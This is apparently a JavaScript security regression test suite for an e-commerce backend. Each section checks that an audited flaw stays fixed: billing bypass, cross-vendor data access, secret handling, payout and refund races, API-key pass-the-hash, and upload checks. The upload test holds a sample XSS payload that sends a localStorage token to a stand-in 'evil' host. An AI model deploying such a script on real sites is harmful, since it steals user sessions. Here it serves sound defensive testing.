/**
 * Security regression suite.
 *
 * One named test per exploit the audit proved. Each must fail against the
 * pre-fix code and pass against the current code — that is what makes it a
 * regression test rather than a description.
 *
 * No database. Everything here exercises pure guards and schema definitions.
 */

import { ok, equal, throwsAsync, section, summary } from './runner.mjs';

// ── B-1 / S-1: unauthenticated free subscription activation ──────────────────
section('B-1 — Free activation of paid subscriptions');
{
    const { activateSubscription, activateInternalSubscription } =
        await import('../../src/services/billing/subscriptionState.service.js');

    const vendor = { _id: 'v1', country: 'India', save: async () => {} };
    const paid = { _id: 'p', price_inr: 4999, price_usd: 59, interval: 'month', interval_count: 1 };
    const mixed = { _id: 'm', price_inr: 0, price_usd: 49, interval: 'month', interval_count: 1 };

    await throwsAsync('a paid plan cannot be activated as a free one',
        () => activateSubscription({ vendor, plan: paid, activationSource: 'zero_price_plan' }),
        'requires payment');

    await throwsAsync('a ₹0/$49 plan cannot be activated free by currency gaming',
        () => activateSubscription({ vendor, plan: mixed, activationSource: 'zero_price_plan' }),
        'requires payment');

    await throwsAsync('a gateway activation requires a payment reference',
        () => activateSubscription({ vendor, plan: paid, activationSource: 'gateway_verified' }),
        'payment reference');

    await throwsAsync('an unknown activation source is refused',
        () => activateSubscription({ vendor, plan: paid, activationSource: 'internal' }),
        'unknown activationsource');

    await throwsAsync('activation with no source at all is refused',
        () => activateSubscription({ vendor, plan: paid }),
        'unknown activationsource');

    await throwsAsync('an admin grant requires an acting admin',
        () => activateSubscription({ vendor, plan: paid, activationSource: 'admin_grant', reason: 'goodwill credit' }),
        'acting admin');

    await throwsAsync('the removed legacy entry point fails loudly',
        () => activateInternalSubscription({}),
        'has been removed');
}

// ── B-4 / S-3: catalogue exfiltration ────────────────────────────────────────
section('B-4 — Catalogue export / import access control');
{
    const { resolveCatalogScope, catalogScopeFilter, assertJobAccess } =
        await import('../../src/utils/catalogScope.js');

    const denied = (user, target) => {
        try { resolveCatalogScope(user, target); return false; } catch { return true; }
    };

    ok('a customer cannot resolve a catalogue scope', denied({ id: 'u', role: 'customer' }));
    ok('a delivery rider cannot resolve a catalogue scope', denied({ id: 'd', role: 'delivery' }));
    ok('a customer supplying targetVendorId is still denied', denied({ id: 'u', role: 'customer' }, 'v9'));
    ok('a roleless caller is denied', denied({}));

    const vendorScope = resolveCatalogScope({ id: 'v1', role: 'vendor' }, 'v-OTHER');
    ok('a vendor is pinned to their own id despite targetVendorId', vendorScope.vendorId === 'v1');
    equal('a vendor query is scoped', catalogScopeFilter(vendorScope), { vendorId: 'v1' });

    const adminScope = resolveCatalogScope({ id: 'a1', role: 'superadmin' });
    ok('cross-vendor admin export is preserved (intended design)',
        adminScope.isAdmin && adminScope.crossVendor);

    const jobDenied = (user, job) => {
        try { assertJobAccess(user, job); return false; } catch { return true; }
    };
    ok("a vendor cannot read another vendor's import job",
        jobDenied({ id: 'v1', role: 'vendor' }, { vendorId: 'v2', uploadedBy: { id: 'v2' } }));
    ok('a vendor can access their own job',
        !jobDenied({ id: 'v1', role: 'vendor' }, { vendorId: 'v1', uploadedBy: { id: 'v1' } }));
}

// ── B-5 / S-4: settings secret destruction ───────────────────────────────────
section('B-5 — Gateway secret preservation');
{
    const { REDACTED_SENTINEL, SECRET_FIELDS } =
        await import('../../src/modules/admin/controllers/settings.controller.js');

    // Mirrors the controller's preservation rule.
    const preserve = (existing, body) => {
        const incoming = { ...body };
        delete incoming._redactedFields;
        for (const field of SECRET_FIELDS) {
            const submitted = incoming[field];
            const unchanged = submitted === undefined || submitted === null
                || String(submitted).trim() === '' || String(submitted) === REDACTED_SENTINEL;
            if (unchanged) {
                if (existing[field] !== undefined) incoming[field] = existing[field];
                else delete incoming[field];
            }
        }
        return incoming;
    };

    const REAL = 'cfsk_live_REAL';
    ok('echoing the redaction sentinel back preserves the real secret',
        preserve({ cashfreeSecretKey: REAL }, { cashfreeSecretKey: REDACTED_SENTINEL }).cashfreeSecretKey === REAL);
    ok('an omitted secret field preserves the real secret',
        preserve({ cashfreeSecretKey: REAL }, { codEnabled: true }).cashfreeSecretKey === REAL);
    ok('an empty string does not clear the secret',
        preserve({ cashfreeSecretKey: REAL }, { cashfreeSecretKey: '' }).cashfreeSecretKey === REAL);
    ok('a genuinely new value does overwrite',
        preserve({ cashfreeSecretKey: REAL }, { cashfreeSecretKey: 'NEW' }).cashfreeSecretKey === 'NEW');
    ok('_redactedFields metadata is never persisted',
        preserve({}, { _redactedFields: ['x'] })._redactedFields === undefined);
    ok('all nine secret fields are covered', SECRET_FIELDS.length === 9);
}

// ── B-6 / D-1: SKU silently dropped ──────────────────────────────────────────
section('B-6 — SKU and costPrice persistence');
{
    const { default: Product } = await import('../../src/models/Product.model.js');
    const doc = new Product({
        name: 'T', slug: 't', price: 10,
        categoryId: '507f1f77bcf86cd799439011',
        vendorId: '507f1f77bcf86cd799439012',
        sku: 'ABC-123', costPrice: 42,
    });
    const obj = doc.toObject();
    ok('sku survives Mongoose strict mode', obj.sku === 'ABC-123');
    ok('costPrice survives Mongoose strict mode', obj.costPrice === 42);
    ok('isDeleted is a real field, not a phantom filter', obj.isDeleted === false);

    const idx = Product.schema.indexes();
    const skuIdx = idx.find(([k]) => k.vendorId === 1 && k.sku === 1);
    ok('SKU uniqueness is scoped per vendor', !!skuIdx && skuIdx[1].unique === true);
    ok('SKU index is PARTIAL, not sparse (sparse would collide on null)',
        JSON.stringify(skuIdx?.[1]?.partialFilterExpression) === '{"sku":{"$type":"string"}}');
}

// ── B-7 / D-6: vendor payout race ────────────────────────────────────────────
section('B-7 — Double payout prevention');
{
    const { default: Settlement } = await import('../../src/models/Settlement.model.js');
    const idx = Settlement.schema.indexes();
    const open = idx.find(([, o]) => o?.name === 'unique_open_settlement_per_vendor');
    ok('only one open settlement per vendor is possible', open?.[1]?.unique === true);
    ok('the guard is partial on status:pending',
        JSON.stringify(open?.[1]?.partialFilterExpression) === '{"status":"pending"}');
}

// ── B-3: refund pipeline ─────────────────────────────────────────────────────
section('B-3 — Refund execution');
{
    const { default: Refund } = await import('../../src/models/Refund.model.js');
    const { getRefundPolicy } = await import('../../src/services/refund/RefundOrchestrator.service.js');

    const policy = await getRefundPolicy();
    ok('refund execution is DISABLED by default (kill switch off)', policy.executionEnabled === false);
    ok('a per-refund ceiling exists', Number.isFinite(policy.maxRefundAmount) && policy.maxRefundAmount > 0);

    const idx = Refund.schema.indexes();
    ok('at most one open refund per order',
        idx.some(([, o]) => o?.name === 'unique_open_refund_per_order' && o?.unique));
    ok('the idempotency key is unique', Refund.schema.path('idempotencyKey').options.unique === true);
    ok('legacy refunds are marked unverified, not succeeded',
        Refund.schema.path('status').enumValues.includes('legacy_unverified'));
}

// ── S-12: unbounded helpful vote ─────────────────────────────────────────────
section('S-12 — Review vote integrity');
{
    const { default: Vote } = await import('../../src/models/ReviewHelpfulVote.model.js');
    const idx = Vote.schema.indexes();
    ok('one helpful vote per user per review',
        idx.some(([k, o]) => k.reviewId === 1 && k.userId === 1 && o?.unique === true));
}

// ── S-14 / logging: PII redaction ────────────────────────────────────────────
section('Log redaction');
{
    const { redact } = await import('../../src/utils/logger.js');
    const r = redact({
        orderId: 'ORD-1',
        shippingAddress: { phone: '9876543210' },
        cashfreeSecretKey: 'live',
        password: 'p',
    });
    ok('shipping address never reaches logs', r.shippingAddress === '[redacted]');
    ok('gateway secrets never reach logs', r.cashfreeSecretKey === '[redacted]');
    ok('passwords never reach logs', r.password === '[redacted]');
    ok('non-sensitive fields are preserved', r.orderId === 'ORD-1');
}

// ── M-4: variant stock never enforced ────────────────────────────────────────
section('M-4 — Variant-aware inventory reservation');
{
    const fs = await import('node:fs');
    const path = await import('node:path');
    const { default: InventoryReservation } = await import('../../src/models/InventoryReservation.model.js');
    const { default: Product } = await import('../../src/models/Product.model.js');

    ok('reservations record which variant they hold',
        Boolean(InventoryReservation.schema.path('variantKey')));
    ok('variantKey defaults to "" not null (unique index treats them differently)',
        InventoryReservation.schema.path('variantKey').options.default === '');

    const idx = InventoryReservation.schema.indexes();
    const unique = idx.find(([, o]) => o?.unique === true);
    ok('the unique hold index includes the variant',
        unique && unique[0].sessionId === 1 && unique[0].productId === 1 && unique[0].variantKey === 1);
    // Two sizes of one shirt in a single cart previously collided on
    // {sessionId, productId} and leaked the reserved quantity.
    ok('two variants of one product can coexist in a cart',
        Object.keys(unique?.[0] || {}).length === 3);

    ok('products track reserved-per-variant', Boolean(Product.schema.path('variants.reservedMap')));

    const src = fs.readFileSync(
        path.resolve(process.cwd(), 'src/services/checkout/InventoryReservationService.js'),
        'utf8'
    );
    const code = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

    ok('reserve holds variant stock atomically alongside product stock',
        code.includes('variants.reservedMap.${variantKey}') && code.includes('$subtract'));
    ok('commit deducts variant stock so stockMap cannot drift from stockQuantity',
        code.includes('variants.stockMap.${key}'));
    ok('release returns the variant hold',
        code.includes('variants.reservedMap.${key}'));
    ok('the duplicate-key path now ROLLS BACK the increment (fixes the D-3 leak)',
        code.includes('err?.code === 11000') && code.includes('const rollback'));
    ok('variant keys are resolved from the client selection object',
        code.includes('resolveVariantKeys') && code.includes('resolveVariantSelection'));
    ok('both reserve and direct-consume paths resolve variant keys',
        (code.match(/resolveVariantKeys\(items\)/g) || []).length === 2);
    ok('unsafe variant keys are rejected, not escaped into a Mongo path',
        code.includes("key.includes('.')") && code.includes("key.startsWith('$')"));
    ok('an out-of-stock message reports VARIANT availability when one was requested',
        code.includes('variantAvailability(product, variantKey)'));
}

// ── S-9: pass-the-hash on integration API keys ───────────────────────────────
section('S-9 — Integration key verification');
{
    const fs = await import('node:fs');
    const path = await import('node:path');
    const crypto = await import('node:crypto');

    const src = fs.readFileSync(
        path.resolve(process.cwd(), 'src/modules/integrations/middlewares/partnerAuth.middleware.js'),
        'utf8'
    );
    // Strip comments — the removal is documented in one, and matching prose
    // instead of code produces a false result in either direction.
    const code = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

    ok('the pass-the-hash branch is gone (stored hash no longer works as a key)',
        !code.includes('safeCompare(apiKey, expectedHash)'));
    ok('a malformed / plaintext apiKeyHash is refused rather than compared',
        code.includes('SHA256_HEX.test(expectedHash)'));
    ok('the peppered digest is still accepted', code.includes('safeCompare(candidateHash, expectedHash)'));
    ok('the legacy unpeppered digest is still accepted (no partner lockout)',
        code.includes('safeCompare(legacyHash, expectedHash)'));
    ok('a legacy key is rehashed on use so the weak form does not persist',
        code.includes('matchedLegacy') && code.includes('apiKeyHash: candidateHash'));

    // The property that matters: a stored digest must not authenticate as a key.
    const pepper = '';
    const realKey = 'partner_live_key_abc123';
    const storedHash = crypto.createHash('sha256').update(`${pepper}:${realKey}`).digest('hex');
    const hashOfHash = crypto.createHash('sha256').update(`${pepper}:${storedHash}`).digest('hex');
    ok('presenting the stored hash as the key no longer produces a match',
        hashOfHash !== storedHash);

    const migration = await import('../../src/migrations/0006_integration_key_hash_hygiene.js');
    ok('a dependency-verification migration exists', migration.default?.id === '0006_integration_key_hash_hygiene');
    ok('  ...and it has a verify() step', typeof migration.default?.verify === 'function');

    const migSrc = fs.readFileSync(
        path.resolve(process.cwd(), 'src/migrations/0006_integration_key_hash_hygiene.js'),
        'utf8'
    );
    ok('the migration refuses to proceed on plaintext keys unless explicitly opted in',
        migSrc.includes('MIGRATE_UPGRADE_PLAINTEXT_KEYS') && migSrc.includes('Refusing to proceed'));
}

// ── S-8: stored XSS via upload ───────────────────────────────────────────────
section('S-8 — Upload content verification');
{
    const fsp = await import('node:fs/promises');
    const path = await import('node:path');
    const os = await import('node:os');
    const { detectFromBuffer, canonicalExtension, verifyFileContent } =
        await import('../../src/utils/fileSignature.js');

    const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]);
    const PDF = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x34]);
    const HTML = Buffer.from('<html><script>fetch("//evil/"+localStorage.token)</script></html>');
    const SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');

    ok('HTML matches no allowed signature', detectFromBuffer(HTML) === null);
    ok('SVG matches no allowed signature', detectFromBuffer(SVG) === null);
    ok('a genuine PNG is detected', detectFromBuffer(PNG)?.mime === 'image/png');
    ok('non-allowed types have no canonical extension', canonicalExtension('text/html') === '');

    const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 's8-'));
    try {
        const evil = path.join(dir, 'payload.html');
        await fsp.writeFile(evil, HTML);
        const verdict = await verifyFileContent(evil, ['image/png', 'image/jpeg', 'image/webp', 'image/gif']);
        ok('EXPLOIT BLOCKED: HTML declared as image/png is rejected', verdict.ok === false);

        const real = path.join(dir, 'real.png');
        await fsp.writeFile(real, PNG);
        ok('a genuine PNG is accepted', (await verifyFileContent(real, ['image/png'])).ok === true);

        const pdf = path.join(dir, 'doc.pdf');
        await fsp.writeFile(pdf, PDF);
        ok('a PDF is rejected on an image-only surface',
            (await verifyFileContent(pdf, ['image/png'])).ok === false);
    } finally {
        await fsp.rm(dir, { recursive: true, force: true });
    }

    const fs = await import('node:fs');
    const upSrc = fs.readFileSync(path.resolve(process.cwd(), 'src/middlewares/upload.js'), 'utf8');
    // Strip comments first — an earlier version of this assertion matched its
    // own explanatory comment and reported a false failure.
    const upCode = upSrc.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
    ok('stored extension never comes from the client filename',
        !upCode.includes('path.extname(file.originalname'));
    ok('the stored extension comes from the canonical allowlist',
        upCode.includes('canonicalExtension(file.mimetype)'));
    ok('all four uploaders compose content verification',
        (upCode.match(/verifyUploadedFiles\(ALLOWED/g) || []).length === 4);

    const appCode = fs.readFileSync(path.resolve(process.cwd(), 'src/app.js'), 'utf8');
    ok('/uploads/tmp is not publicly served', appCode.includes("'/tmp/'"));
    ok('served uploads carry nosniff', appCode.includes('X-Content-Type-Options'));
    ok('served uploads carry a sandbox CSP', appCode.includes('sandbox'));
}

// ── M-7: paid orders were uncancellable ──────────────────────────────────────
section('M-7 — Paid-order cancellation');
{
    const fs = await import('node:fs');
    const path = await import('node:path');
    const controller = fs.readFileSync(
        path.resolve(process.cwd(), 'src/modules/user/controllers/order.controller.js'),
        'utf8'
    );
    const splitter = fs.readFileSync(
        path.resolve(process.cwd(), 'src/services/checkout/OrderSplitterEngine.js'),
        'utf8'
    );

    // The defect was a mismatch between the status a paid order receives and
    // the statuses the cancel gate accepted.
    const paidStatusMatch = splitter.match(/status:\s*session\.paymentStatus === 'paid' \? '(\w+)'/);
    const paidStatus = paidStatusMatch?.[1];
    ok('a paid order is created with a known status', Boolean(paidStatus));

    const gateMatch = controller.match(/CUSTOMER_CANCELLABLE_STATUSES = \[([^\]]+)\]/);
    const gate = gateMatch ? gateMatch[1].split(',').map((s) => s.trim().replace(/'/g, '')) : [];
    ok('a cancellable-status list exists', gate.length > 0);
    ok(`the paid-order status ('${paidStatus}') is cancellable`, gate.includes(paidStatus));
    ok('pre-payment statuses remain cancellable',
        gate.includes('pending') && gate.includes('processing'));
    ok('a dispatched order is NOT customer-cancellable (returns flow instead)',
        !gate.includes('shipped') && !gate.includes('out_for_delivery') && !gate.includes('delivered'));

    ok('cancelling a paid order issues a refund',
        controller.includes('requestAndTryExecute') && controller.includes('cancelled by customer'));
    ok('the refund is issued AFTER the transaction commits, not inside it',
        controller.indexOf('await session.endSession()') < controller.indexOf('cancellationRefund = await requestAndTryExecute'));
    ok('a refund failure alerts admins rather than failing the cancellation',
        controller.includes('Cancellation refund not recorded'));
    ok('the response never claims the money has arrived',
        controller.includes('has been initiated and is being processed'));
}

// ── S-5: unenforced permission tokens ────────────────────────────────────────
section('S-5 — Permission coverage');
{
    const fs = await import('node:fs');
    const path = await import('node:path');
    const { PERMISSIONS, RETIRED_PERMISSIONS, PRESET_ROLES, PERMISSION_DEPENDENCIES } =
        await import('../../src/constants/permissions.js');

    const SRC = path.resolve(process.cwd(), 'src');
    const CONSTANTS = path.join(SRC, 'constants', 'permissions.js');
    const walk = (dir, acc = []) => {
        for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
            const full = path.join(dir, e.name);
            if (e.isDirectory()) walk(full, acc);
            else if (e.isFile() && e.name.endsWith('.js') && full !== CONSTANTS) acc.push(full);
        }
        return acc;
    };
    const corpus = walk(SRC).map((f) => fs.readFileSync(f, 'utf8')).join('\n');

    const unenforced = Object.entries(PERMISSIONS).filter(
        ([name, value]) => !corpus.includes(`PERMISSIONS.${name}`) && !corpus.includes(`'${value}'`)
    );
    ok(`every permission token is enforced by a route (${Object.keys(PERMISSIONS).length} tokens)`,
        unenforced.length === 0);
    if (unenforced.length) console.log('    unenforced:', unenforced.map(([n]) => n).join(', '));

    const resurrected = RETIRED_PERMISSIONS.filter((r) => corpus.includes(`'${r}'`));
    ok('no retired token has reappeared in source', resurrected.length === 0);

    // A retired token must not survive inside a preset — that is how an
    // operator ends up granting something inert.
    const inPresets = Object.entries(PRESET_ROLES).flatMap(([role, def]) =>
        (def.permissions || []).filter((p) => RETIRED_PERMISSIONS.includes(p)).map((p) => `${role}:${p}`)
    );
    ok('no preset role grants a retired token', inPresets.length === 0);

    const activeValues = new Set(Object.values(PERMISSIONS));
    const danglingDeps = Object.entries(PERMISSION_DEPENDENCIES).filter(
        ([k, v]) => !activeValues.has(k) || !activeValues.has(v)
    );
    ok('permission dependency graph references only active tokens', danglingDeps.length === 0);
    if (danglingDeps.length) console.log('    dangling:', JSON.stringify(danglingDeps));

    ok('sub-admin management is NOT delegable by token (superadmin-only by design)',
        !Object.values(PERMISSIONS).some((p) => p.startsWith('subadmin.')));
}

// ── Environment contract ─────────────────────────────────────────────────────
section('Environment contract');
{
    const { collectEnvViolations } = await import('../../src/config/env.js');
    const snapshot = { ...process.env };
    const reset = (o) => {
        for (const k of Object.keys(process.env)) {
            if (/^(MONGO_URI|JWT_|CLOUDINARY_|NODE_ENV|CLIENT_URL|CASHFREE_|SMTP_|USE_MOCK_OTP|MOCK_OTP|DISABLE_GEO|INTEGRATION_)/.test(k)) {
                delete process.env[k];
            }
        }
        Object.assign(process.env, o);
    };

    const prodComplete = {
        NODE_ENV: 'production', MONGO_URI: 'm',
        JWT_SECRET: 'x'.repeat(40), JWT_REFRESH_SECRET: 'y'.repeat(40),
        CLOUDINARY_CLOUD_NAME: 'c', CLOUDINARY_API_KEY: 'k', CLOUDINARY_API_SECRET: 's',
        CLIENT_URL: 'https://x', CASHFREE_APP_ID: 'a', CASHFREE_SECRET_KEY: 'b',
        CASHFREE_ENV: 'production', SMTP_HOST: 'h', SMTP_USER: 'u', SMTP_PASS: 'p',
        // Carrier credentials are production-required: without them retail and
        // wholesale orders cannot be despatched at all.
        DTDC_CUSTOMER_CODE: 'cc', DTDC_API_KEY: 'ak', DTDC_ENVIRONMENT: 'production',
    };

    reset(prodComplete);
    ok('a complete production environment passes', collectEnvViolations().length === 0);

    reset({ ...prodComplete, DTDC_ENVIRONMENT: 'sandbox' });
    ok('a sandbox courier environment is rejected in production',
        collectEnvViolations().some((v) => v.key === 'DTDC_ENVIRONMENT'));

    reset({ ...prodComplete, DTDC_API_KEY: '' });
    ok('a missing courier API key is rejected in production',
        collectEnvViolations().some((v) => v.key === 'DTDC_API_KEY'));

    reset({ ...prodComplete, USE_MOCK_OTP: 'true' });
    ok('mock OTP is rejected in production',
        collectEnvViolations().some((v) => v.key === 'USE_MOCK_OTP'));

    reset({ ...prodComplete, CASHFREE_ENV: 'sandbox' });
    ok('a sandbox gateway is rejected in production',
        collectEnvViolations().some((v) => v.key === 'CASHFREE_ENV'));

    reset(snapshot);
}

process.exit(summary() ? 0 : 1);
